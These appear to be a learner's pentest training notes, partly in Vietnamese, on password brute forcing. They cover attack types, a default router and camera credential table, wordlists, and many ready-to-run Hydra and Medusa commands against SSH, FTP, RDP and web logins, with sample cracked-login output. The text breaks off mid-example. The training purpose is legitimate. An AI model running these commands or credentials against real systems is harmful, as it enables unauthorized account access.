| Phương pháp                          | Mô tả                                                                           |                                                                             Ví dụ | Khi thích hợp                                                                  |
| ------------------------------------ | ------------------------------------------------------------------------------- | --------------------------------------------------------------------------------: | ------------------------------------------------------------------------------ |
| Simple Brute Force (Mò toàn bộ)      | Thử toàn bộ kết hợp ký tự trong bộ ký tự và độ dài xác định.                    |                    Thử mọi kết hợp chữ thường `a`–`z` cho mật khẩu dài 4–6 ký tự. | Không có thông tin trước về mật khẩu và có tài nguyên tính toán dư dả.         |
| Dictionary Attack (Tấn công từ điển) | Dùng danh sách từ/chuỗi/mật khẩu phổ biến để thử.                               |                           Thử mật khẩu từ file `rockyou.txt` trên form đăng nhập. | Nghi ngờ mục tiêu dùng mật khẩu yếu hoặc theo mẫu phổ biến.                    |
| Hybrid Attack (Hỗn hợp)              | Kết hợp brute-force và từ điển — thường thêm/bớt ký tự vào từ trong từ điển.    |                      Thêm số hoặc ký tự đặc biệt vào cuối các từ trong danh sách. | Mục tiêu có thể dùng biến thể đơn giản của mật khẩu phổ biến.                  |
| Credential Stuffing                  | Dùng danh sách thông tin đăng nhập rò rỉ để thử trên nhiều dịch vụ.             |             Dùng cặp username/password rò rỉ để đăng nhập vào các tài khoản khác. | Có bộ lớn credentials rò rỉ; nghi người dùng tái sử dụng mật khẩu.             |
| Password Spraying                    | Thử một tập mật khẩu phổ biến trên nhiều username (giảm rủi ro khóa tài khoản). |                   Thử `password123` hoặc `qwerty` cho toàn bộ user trong tổ chức. | Có chính sách khóa tài khoản; muốn tránh bị phát hiện bằng cách dàn trải.      |
| Rainbow Table Attack (Bảng cầu vồng) | Dùng bảng băm tiền xử lý để đảo hash về plaintext nhanh.                        |   Tiền tính trước các hash cho mọi mật khẩu khả dĩ rồi so khớp với hash thu được. | Cần crack nhiều hash và có không gian lưu trữ lớn cho bảng.                    |
| Reverse Brute Force (Mò ngược)       | Dùng một mật khẩu cố định thử trên nhiều username.                              | Dùng mật khẩu rò rỉ từ Dịch vụ A để thử đăng nhập hàng loạt username ở Dịch vụ B. | Nghi ngờ một mật khẩu cụ thể được tái sử dụng rộng rãi.                        |
| Distributed Brute Force (Phân tán)   | Phân chia công việc brute-force vào nhiều máy để tăng tốc.                      |                                      Dùng cụm máy để tăng số thử nghiệm mỗi giây. | Mật khẩu/khóa rất phức tạp và một máy đơn không đủ sức trong thời gian hợp lý. |


The Role of Brute Forcing in Penetration Testing
Penetration testing, or ethical hacking, is a proactive cybersecurity measure that simulates real-world attacks to identify and address vulnerabilities before malicious actors can exploit them. Brute forcing is a crucial tool in this process, particularly when assessing the resilience of password-based authentication mechanisms.

While penetration tests encompass a range of techniques, brute forcing is often strategically employed when:

Other avenues are exhausted: Initial attempts to gain access, such as exploiting known vulnerabilities or utilizing social engineering tactics, may prove unsuccessful. In such scenarios, brute forcing is a viable alternative to overcome password barriers.
Password policies are weak: If the target system employs lax password policies, it increases the likelihood of users having weak or easily guessable passwords. Brute forcing can effectively expose these vulnerabilities.
Specific accounts are targeted: In some instances, penetration testers may focus on compromising specific user accounts, such as those with elevated privileges. Brute forcing can be tailored to target these accounts directly.


=================================================================== Password Security Fundamentals ===================================================================
=================================================================== Password Security Fundamentals ===================================================================
=================================================================== Password Security Fundamentals ===================================================================


Danh sách mật khẩu mặc định một số thiết bị 

| Device/Manufacturer  | Default Username | Default Password | Device Type                  |
| -------------------- | ---------------- | ---------------- | ---------------------------- |
| Linksys Router       | admin            | admin            | Wireless Router              |
| D-Link Router        | admin            | admin            | Wireless Router              |
| Netgear Router       | admin            | password         | Wireless Router              |
| TP-Link Router       | admin            | admin            | Wireless Router              |
| Cisco Router         | cisco            | cisco            | Network Router               |
| Asus Router          | admin            | admin            | Wireless Router              |
| Belkin Router        | admin            | password         | Wireless Router              |
| Zyxel Router         | admin            | 1234             | Wireless Router              |
| Samsung SmartCam     | admin            | 4321             | IP Camera                    |
| Hikvision DVR        | admin            | 12345            | Digital Video Recorder (DVR) |
| Axis IP Camera       | root             | pass             | IP Camera                    |
| Ubiquiti UniFi AP    | ubnt             | ubnt             | Wireless Access Point        |
| Canon Printer        | admin            | admin            | Network Printer              |
| Honeywell Thermostat | admin            | 1234             | Smart Thermostat             |
| Panasonic DVR        | admin            | 12345            | Digital Video Recorder (DVR) |





=================================================================== Brute Force Attacks ===================================================================
=================================================================== Brute Force Attacks ===================================================================
=================================================================== Brute Force Attacks ===================================================================


  Tính : Possible Combinations = Character Set Size^Password Length

| Mức độ / Ghi chú        | Độ dài mật khẩu | Bộ ký tự                                              |                       Số tổ hợp (exact) |      Số tổ hợp (khoa học) |
| ----------------------- | --------------: | ----------------------------------------------------- | --------------------------------------: | ------------------------: |
| Short and Simple        |               6 | Lowercase letters (a–z)                               |                      26^6 = 308,915,776 |         3.08915776 × 10^8 |
| Longer but Still Simple |               8 | Lowercase letters (a–z)                               |                  26^8 = 208,827,064,576 |     2.08827064576 × 10^11 |
| Adding Complexity       |               8 | Lowercase + Uppercase (a–z, A–Z)                      |               52^8 = 53,459,728,531,456 |   5.3459728531456 × 10^13 |
| Maximum Complexity      |              12 | Lowercase + Uppercase + numbers + symbols (≈94 chars) | 94^12 = 475,920,314,814,253,376,475,136 | 4.759203148142534 × 10^23 |




| Wordlist                                  | Description                                                                                      | Typical Use                                        | Source                 |
| ----------------------------------------- | ------------------------------------------------------------------------------------------------ | -------------------------------------------------- | ---------------------- |
| rockyou.txt                               | A popular password wordlist containing millions of passwords leaked from the RockYou breach.     | Commonly used for password brute force attacks.    | RockYou breach dataset |
| top-usernames-shortlist.txt               | A concise list of the most common usernames.                                                     | Suitable for quick brute force username attempts.  | SecLists               |
| xato-net-10-million-usernames.txt         | A more extensive list of 10 million usernames.                                                   | Used for thorough username brute forcing.          | SecLists               |
| 2023-200_most_used_passwords.txt          | A list of the 200 most commonly used passwords as of 2023.                                       | Effective for targeting commonly reused passwords. | SecLists               |
| Default-Credentials/default-passwords.txt | A list of default usernames and passwords commonly used in routers, software, and other devices. | Ideal for trying default credentials.              | SecLists               |


=========================================================== Hybrid Attacks ===========================================================
=========================================================== Hybrid Attacks ===========================================================
=========================================================== Hybrid Attacks ===========================================================






The attacker begins by launching a dictionary attack, using a wordlist curated with common passwords, industry-specific terms, and potentially personal information related to the organization or its employees. This phase attempts to quickly identify any low-hanging fruit - accounts protected by weak or easily guessable passwords.

However, if the dictionary attack proves unsuccessful, the hybrid attack seamlessly transitions into a brute-force mode. Instead of randomly generating password combinations, it strategically modifies the words from the original wordlist, appending numbers, special characters, or even incrementing years, as in our "Summer2023" example.

This targeted brute-force approach drastically reduces the search space compared to a traditional brute-force attack while covering many potential password variations that users might employ to comply with the password change policy.

The Power of Hybrid Attacks
The effectiveness of hybrid attacks lies in their adaptability and efficiency. They leverage the strengths of both dictionary and brute-force techniques, maximizing the chances of cracking passwords, especially in scenarios where users fall into predictable patterns.

It's important to note that hybrid attacks are not limited to the password change scenario described above. They can be tailored to exploit any observed or suspected password patterns within a target organization. Let's consider a scenario where you have access to a common passwords wordlist, and you're targeting an organization with the following password policy:
  Minimum length: 8 characters
  Must include:
    At least one uppercase letter
    At least one lowercase letter
    At least one number

To extract only the passwords that adhere to this policy, we can leverage the powerful command-line tools available on most Linux/Unix-based systems by default, specifically grep paired with regex. We are going to use the darkweb2017-top10000.txt password list for this. First, download the wordlist
  naruto3co@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
Next, we need to start matching that wordlist to the password policy.
  naruto3co@htb[/htb]$ grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
This initial grep command targets the core policy requirement of a minimum password length of 8 characters. The regular expression ^.{8,}$ acts as a filter, ensuring that only passwords containing at least 8 characters are passed through and saved in a temporary file named darkweb2017-minlength.txt.
  naruto3co@htb[/htb]$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
Building upon the previous filter, this grep command enforces the policy's demand for at least one uppercase letter. The regular expression [A-Z] ensures that any password lacking an uppercase letter is discarded, further refining the list saved in darkweb2017-uppercase.txt.
  naruto3co@htb[/htb]$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
Maintaining the filtering chain, this grep command ensures compliance with the policy's requirement for at least one lowercase letter. The regular expression [a-z] serves as the filter, keeping only passwords that include at least one lowercase letter and storing them in darkweb2017-lowercase.txt.
  naruto3co@htb[/htb]$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
This last grep command tackles the policy's numerical requirement. The regular expression [0-9] acts as a filter, ensuring that passwords containing at least one numerical digit are preserved in darkweb2017-number.txt.
  
As demonstrated by the output above, meticulously filtering the extensive 10,000-password list against the password policy has dramatically narrowed down our potential passwords to 89. This drastic reduction in the search space represents a significant boost in efficiency for any subsequent password cracking attempts. A smaller, targeted list translates to a faster and more focused attack, optimizing the use of computational resources and increasing the likelihood of a successful breach.

Credential Stuffing: Leveraging Stolen Data for Unauthorized Access



# Credential-based Attack Flow

Mô tả sơ đồ luồng tấn công dựa trên thông tin đăng nhập (credential-based attack).

```mermaid
flowchart LR
  subgraph SourcesOfCredentials["Sources of Credentials"]
    DB[/"Data Breaches"/]
    PH[/"Phishing Scams"/]
    MW[/"Malware"/]
    WL[/"Public Wordlists\n(rockyou, seclists)"/]
  end

  subgraph Attacker["Attacker"]
    ACQ("Acquiring Credentials")
    IDT("Identifying Targets")
    AT("Automated Testing")
    UA("Unauthorized Access")
  end

  subgraph Consequences["Consequences"]
    DT[/"Data Theft"/]
    IF[/"Identity Fraud"/]
    FC[/"Financial Crimes"/]
    FA[/"Further Attacks"/]
  end

  DB --> ACQ
  PH --> ACQ
  MW --> ACQ
  WL --> ACQ

  ACQ --> IDT --> AT --> UA

  UA --> DT
  UA --> IF
  UA --> FC
  UA --> FA
```

# hydra

Hydra is a fast network login cracker that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including web applications, remote login services like SSH and FTP, and even databases.

Hydra's popularity stems from its:
  Speed and Efficiency: Hydra utilizes parallel connections to perform multiple login attempts simultaneously, significantly speeding up the cracking process.
  Flexibility: Hydra supports many protocols and services, making it adaptable to various attack scenarios.
  Ease of Use: Hydra is relatively easy to use despite its power, with a straightforward command-line interface and clear syntax.

  naruto3co@htb[/htb]$ hydra -h

If Hydra is not installed or you are using a different Linux distribution, you can install it from the package repository:
  naruto3co@htb[/htb]$ sudo apt-get -y update
  naruto3co@htb[/htb]$ sudo apt-get -y install hydra 


Basic Usage
Hydra's basic syntax is:  
  naruto3co@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]


| Parameter | Explanation | Usage Example |
|---|---|---|
| `-l LOGIN` or `-L FILE` | Login options: specify either a single username (`-l`) or a file containing a list of usernames (`-L`). | `hydra -l admin ...` or `hydra -L usernames.txt ...` |
| `-p PASS` or `-P FILE` | Password options: provide either a single password (`-p`) or a file containing a list of passwords (`-P`). | `hydra -p password123 ...` or `hydra -P passwords.txt ...` |
| `-t TASKS` | Tasks: define the number of parallel tasks (threads) to run, potentially speeding up the attack. | `hydra -t 4 ...` |
| `-f` | Fast mode: stop the attack after the first successful login is found. | `hydra -f ...` |
| `-s PORT` | Port: specify a non-default port for the target service. | `hydra -s 2222 ...` |
| `-v` or `-V` | Verbose output: display detailed information about the attack's progress, including attempts and results. (`-V` = more verbose) | `hydra -v ...` or `hydra -V ...` |
| `service://server` | Target: specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname. | `hydra ssh://192.168.1.100` |
| `/OPT` | Service-specific options: provide any additional options required by the target service (e.g., form fields for HTTP). | `hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` |


Hydra Services
Hydra services essentially define the specific protocols or services that Hydra can target. They enable Hydra to interact with different authentication mechanisms used by various systems, applications, and network services. Each module is designed to understand a particular protocol's communication patterns and authentication requirements, allowing Hydra to send appropriate login requests and interpret the responses. Below is a table of commonly used services:


| Hydra Service | Service / Protocol | Description | Example Command |
|---|---|---|---|
| `ftp` | File Transfer Protocol (FTP) | Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100` |
| `ssh` | Secure Shell (SSH) | Targets SSH services to brute-force credentials, commonly used for secure remote login to systems. | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100` |
| `http-get/post` | HTTP Web Services | Used to brute-force login credentials for HTTP web login forms using either GET or POST requests. | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| `smtp` | Simple Mail Transfer Protocol (SMTP) | Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails. | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com` |
| `pop3` | Post Office Protocol (POP3) | Targets email retrieval services to brute-force credentials for POP3 login. | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com` |
| `imap` | Internet Message Access Protocol (IMAP) | Used to brute-force credentials for IMAP services, which allow users to access their email remotely. | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com` |
| `mysql` | MySQL Database | Attempts to brute-force login credentials for MySQL databases. | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100` |
| `mssql` | Microsoft SQL Server | Targets Microsoft SQL servers to brute-force database login credentials. | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100` |
| `vnc` | Virtual Network Computing (VNC) | Brute-forces VNC services, used for remote desktop access. | `hydra -P /path/to/password_list.txt vnc://192.168.1.100` |
| `rdp` | Remote Desktop Protocol (RDP) | Targets Microsoft RDP services for remote login brute-forcing. | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100` |


Brute-Forcing HTTP Authentication
Imagine you're tasked with testing the security of a website using basic HTTP authentication at www.example.com. You have a list of potential usernames stored in usernames.txt and corresponding passwords in passwords.txt. To launch a brute-force attack against this HTTP service, use the following Hydra command:

```bash
  naruto3co@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

This command instructs Hydra to:
  Use the list of usernames from the usernames.txt file.
  Use the list of passwords from the passwords.txt file.
  Target the website www.example.com.
  Employ the http-get module to test the HTTP authentication.
Hydra will systematically try each username-password combination against the target website to discover a valid login.

Targeting Multiple SSH Servers
Consider a situation where you have identified several servers that may be vulnerable to SSH brute-force attacks. You compile their IP addresses into a file named targets.txt and know that these servers might use the default username "root" and password "toor." To efficiently test all these servers simultaneously, use the following Hydra command:
  naruto3co@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh

This command instructs Hydra to:
  Use the username "root".
  Use the password "toor".
  Target all IP addresses listed in the targets.txt file.
  Employ the ssh module for the attack.
Hydra will execute parallel brute-force attempts on each server, significantly speeding up the process.

Testing FTP Credentials on a Non-Standard Port
Imagine you need to assess the security of an FTP server hosted at ftp.example.com, which operates on a non-standard port 2121. You have lists of potential usernames and passwords stored in usernames.txt and passwords.txt, respectively. To test these credentials against the FTP service, use the following Hydra command:
```bash
  naruto3co@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

This command instructs Hydra to:
  Use the list of usernames from the usernames.txt file.
  Use the list of passwords from the passwords.txt file.
  Target the FTP service on ftp.example.com via port 2121.
  Use the ftp module and provide verbose output (-V) for detailed monitoring.
  Hydra will attempt to match each username-password combination against the FTP server on the specified port.

Brute-Forcing a Web Login Form
Suppose you are tasked with brute-forcing a login form on a web application at www.example.com. You know the username is "admin," and the form parameters for the login are user=^USER^&pass=^PASS^. To perform this attack, use the following Hydra command:

```bash
  naruto3co@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

This command instructs Hydra to:
  Use the username "admin".
  Use the list of passwords from the passwords.txt file.
  Target the login form at /login on www.example.com.
  Employ the http-post-form module with the specified form parameters.
  Look for a successful login indicated by the HTTP status code 302.
  Hydra will systematically attempt each password for the "admin" account, checking for the specified success condition.

Advanced RDP Brute-Forcing
Now, imagine you're testing a Remote Desktop Protocol (RDP) service on a server with IP 192.168.1.100. You suspect the username is "administrator," and that the password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers. To carry out this precise attack, use the following Hydra command:
```bash
  naruto3co@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

This command instructs Hydra to:
  Use the username "administrator".
  Generate and test passwords ranging from 6 to 8 characters, using the specified character set.
  Target the RDP service on 192.168.1.100.
  Employ the rdp module for the attack.
Hydra will generate and test all possible password combinations within the specified parameters, attempting to break into the RDP service.

# Basic HTTP Authentication

Web applications often employ authentication mechanisms to protect sensitive data and functionalities. Basic HTTP Authentication, or simply Basic Auth, is a rudimentary yet common method for securing resources on the web. Though easy to implement, its inherent security vulnerabilities make it a frequent target for brute-force attacks.

In essence, Basic Auth is a challenge-response protocol where a web server demands user credentials before granting access to protected resources. The process begins when a user attempts to access a restricted area. The server responds with a 401 Unauthorized status and a WWW-Authenticate header prompting the user's browser to present a login dialog.

Once the user provides their username and password, the browser concatenates them into a single string, separated by a colon. This string is then encoded using Base64 and included in the Authorization header of subsequent requests, following the format Basic <encoded_credentials>. The server decodes the credentials, verifies them against its database, and grants or denies access accordingly.

For example, the headers for Basic Auth in a HTTP GET request would look like:
  GET /protected_resource HTTP/1.1
  Host: www.example.com
  Authorization: Basic YWxpY2U6c2VjcmV0MTIz
  
Exploiting Basic Auth with Hydra

  To follow along, start the target system via the question section at the bottom of the page.

We will use the http-get hydra service to brute force the basic authentication target.
In this scenario, the spawned target instance employs Basic HTTP Authentication. We already know the username is basic-auth-user. Since we know the username, we can simplify the Hydra command and focus solely on brute-forcing the password. Here's the command we'll use:

```bash
  # Download wordlist if needed
  [!bash!]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
  # Hydra command
  [!bash!]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
  
  ...
  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
  [DATA] attacking http-get://127.0.0.1:81/
  [81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ...
  1 of 1 target successfully completed, 1 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32
```
Let's break down the command:
  -l basic-auth-user: This specifies that the username for the login attempt is 'basic-auth-user'.
  -P 2023-200_most_used_passwords.txt: This indicates that Hydra should use the password list contained in the file '2023-200_most_used_passwords.txt' for its brute-force attack.
  127.0.0.1: This is the target IP address, in this case, the local machine (localhost).
  http-get /: This tells Hydra that the target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path ('/').
  -s 81: This overrides the default port for the HTTP service and sets it to 81.

Upon execution, Hydra will systematically attempt each password from the 2023-200_most_used_passwords.txt file against the specified resource. Eventually it will return the correct password for basic-auth-user, which you can use to login to the website and retrieve the flag.


# Login Forms
Nó là login method POST 
```bash
  naruto3co@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
```
```bash
  hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

However, sometimes you may not have a clear failure message but instead have a distinct success condition. For instance, if the application redirects the user after a successful login (using HTTP status code 302), or displays specific content (like "Dashboard" or "Welcome"), you can configure Hydra to look for that success condition using S=. Here’s an example where a successful login results in a 302 redirect:
```bash
  hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

In this case, Hydra will treat any response that returns an HTTP 302 status code as a successful login. Similarly, if a successful login results in content like "Dashboard" appearing on the page, you can configure Hydra to look for that keyword as a success condition:
```bash
  hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

Hydra will now register the login as successful if it finds the word "Dashboard" in the server’s response.

Before unleashing Hydra on a login form, it's essential to gather intelligence on its inner workings. This involves pinpointing the exact parameters the form uses to transmit the username and password to the server.
Manual Inspection
Upon accessing the IP:PORT in your browser, a basic login form is presented. Using your browser's developer tools (typically by right-clicking and selecting "Inspect" or a similar option), you can view the underlying HTML code for this form. Let's break down its key components:

```bash
  <form method="POST">
      <h2>Login</h2>
      <label for="username">Username:</label>
      <input type="text" id="username" name="username">
      <label for="password">Password:</label>
      <input type="password" id="password" name="password">
      <input type="submit" value="Login">
  </form>
```

The HTML reveals a simple login form. Key points for Hydra:
  Method: POST - Hydra will need to send POST requests to the server.
  Fields:
    Username: The input field named username will be targeted.
    Password: The input field named password will be targeted.

With these details, you can construct the Hydra command to automate the brute-force attack against this login form.

Browser Developer Tools
  After inspecting the form, open your browser's Developer Tools (F12) and navigate to the "Network" tab. Submit a sample login attempt with any credentials. This will allow you to see the POST request sent to the server. In the "Network" tab, find the request corresponding to the form submission and check the form data, headers, and the server’s response.

![ảnh](https://academy.hackthebox.com/storage/modules/57/devtools.png)
This information further solidifies the information we will need for Hydra. We now have definitive confirmation of both the target path (/) and the parameter names (username and password).

Proxy Interception
For more complex scenarios, intercepting the network traffic with a proxy tool like Burp Suite or OWASP ZAP can be invaluable. Configure your browser to route its traffic through the proxy, then interact with the login form. The proxy will capture the POST request, allowing you to dissect its every component, including the precise login parameters and their values.

Constructing the params String for Hydra
After analyzing the login form's structure and behavior, it's time to build the params string, a critical component of Hydra's http-post-form attack module. This string encapsulates the data that will be sent to the server with each login attempt, mimicking a legitimate form submission.
The params string consists of key-value pairs, similar to how data is encoded in a POST request. Each pair represents a field in the login form, with its corresponding value.
  Form Parameters: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (^USER^ and ^PASS^) within these parameters with values from your wordlists.
  Additional Fields: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the params string. These can have static values or dynamic placeholders if their values change with each request.
  Success Condition: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like S=302 for a redirect) or the presence or absence of specific text in the server's response (e.g., F=Invalid credentials or S=Welcome).

Let's apply this to our scenario. We've discovered:
  The form submits data to the root path (/).
  The username field is named username.
  The password field is named password.
  An error message "Invalid credentials" is displayed upon failed login.
Therefore, our params string would be:
```bash
  /:username=^USER^&password=^PASS^:F=Invalid credentials
```
  "/": The path where the form is submitted.
  username=^USER^&password=^PASS^: The form parameters with placeholders for Hydra.
  F=Invalid credentials: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.
We will be using top-usernames-shortlist.txt for the username list, and 2023-200_most_used_passwords.txt for the password list.

This params string is incorporated into the Hydra command as follows. Hydra will systematically substitute ^USER^ and ^PASS^ with values from your wordlists, sending POST requests to the target and analyzing the responses for the specified failure condition. If a login attempt doesn't trigger the "Invalid credentials" message, Hydra will flag it as a potential success, revealing the valid credentials.
```bash
  # Download wordlists if needed
  naruto3co@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
  naruto3co@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
  # Hydra command
  naruto3co@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
  
  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 12:51:14
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
  [DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:F=Invalid credentials
  [5000][http-post-form] host: IP   login: ...   password: ...
  [STATUS] attack finished for IP (valid pair found)
  1 of 1 target successfully completed, 1 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 12:51:28
```

Bài thực hành : hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.53.81 -s 57732 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

# Medusa

Medusa, a prominent tool in the cybersecurity arsenal, is designed to be a fast, massively parallel, and modular login brute-forcer. Its primary objective is to support a wide array of services that allow remote authentication, enabling penetration testers and security professionals to assess the resilience of login systems against brute-force attacks.
Installation
Medusa often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:
```bash
  naruto3co@htb[/htb]$ medusa -h
```

Installing Medusa on a Linux system is straightforward.
```bash
  naruto3co@htb[/htb]$ sudo apt-get -y update
  naruto3co@htb[/htb]$ sudo apt-get -y install medusa
```

Command Syntax and Parameter Table
Medusa's command-line interface is straightforward. It allows users to specify hosts, users, passwords, and modules with various options to fine-tune the attack process.
```bash
  naruto3co@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
```

| Parameter | Explanation | Usage Example |
|---|---|---|
| `-h HOST` or `-H FILE` | Target options: specify either a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`). | `medusa -h 192.168.1.10 ...` or `medusa -H targets.txt ...` |
| `-u USERNAME` or `-U FILE` | Username options: provide either a single username (`-u`) or a file containing a list of usernames (`-U`). | `medusa -u admin ...` or `medusa -U usernames.txt ...` |
| `-p PASSWORD` or `-P FILE` | Password options: specify either a single password (`-p`) or a file containing a list of passwords (`-P`). | `medusa -p password123 ...` or `medusa -P passwords.txt ...` |
| `-M MODULE` | Module: define the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`). | `medusa -M ssh ...` |
| `-m "MODULE_OPTION"` | Module options: provide additional parameters required by the chosen module, enclosed in quotes. | `medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ...` |
| `-t TASKS` | Tasks: define the number of parallel login attempts to run, potentially speeding up the attack. | `medusa -t 4 ...` |
| `-f` or `-F` | Fast mode: stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`). | `medusa -f ...` or `medusa -F ...` |
| `-n PORT` | Port: specify a non-default port for the target service. | `medusa -n 2222 ...` |
| `-v LEVEL` | Verbose output: display detailed information about the attack's progress. The higher the LEVEL (up to 6), the more verbose the output. | `medusa -v 4 ...` |

Medusa Modules
Each module in Medusa is tailored to interact with specific authentication mechanisms, allowing it to send the appropriate requests and interpret responses for successful attacks. Below is a table of commonly used modules:

| Medusa Module | Service / Protocol | Description | Usage Example |
|---|---|---|---|
| `ftp` | File Transfer Protocol (FTP) | Brute-forcing FTP login credentials, used for file transfers over a network. | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt` |
| `http` | Hypertext Transfer Protocol (HTTP) | Brute-forcing login forms on web applications over HTTP (GET/POST). | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^` |
| `imap` | Internet Message Access Protocol (IMAP) | Brute-forcing IMAP logins, often used to access email servers. | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt` |
| `mysql` | MySQL Database | Brute-forcing MySQL database credentials, commonly used for web applications and databases. | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt` |
| `pop3` | Post Office Protocol 3 (POP3) | Brute-forcing POP3 logins, typically used to retrieve emails from a mail server. | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt` |
| `rdp` | Remote Desktop Protocol (RDP) | Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems. | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt` |
| `ssh` | Secure Shell (SSHv2) | Brute-forcing SSH logins, commonly used for secure remote access. | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt` |
| `svn` | Subversion (SVN) | Brute-forcing Subversion (SVN) repositories for version control. | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt` |
| `telnet` | Telnet Protocol | Brute-forcing Telnet services for remote command execution on older systems. | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt` |
| `vnc` | Virtual Network Computing (VNC) | Brute-forcing VNC login credentials for remote desktop access. | `medusa -M vnc -h 192.168.1.100 -P passwords.txt` |
| `web-form` | Web Form (HTTP POST) | Brute-forcing login forms on websites using HTTP POST requests. | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"` |

Targeting an SSH Server
Imagine a scenario where you need to test the security of an SSH server at 192.168.0.100. You have a list of potential usernames in usernames.txt and common passwords in passwords.txt. To launch a brute-force attack against the SSH service on this server, use the following Medusa command:
```bash
  naruto3co@htb[/htb]$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
```
This command instructs Medusa to:
  Target the host at 192.168.0.100.
  Use the usernames from the usernames.txt file.
  Test the passwords listed in the passwords.txt file.
  Employ the ssh module for the attack.
  
Medusa will systematically try each username-password combination against the SSH service to attempt to gain unauthorized access.

Targeting Multiple Web Servers with Basic HTTP Authentication
Suppose you have a list of web servers that use basic HTTP authentication. These servers' addresses are stored in web_servers.txt, and you also have lists of common usernames and passwords in usernames.txt and passwords.txt, respectively. To test these servers concurrently, execute:
```bash
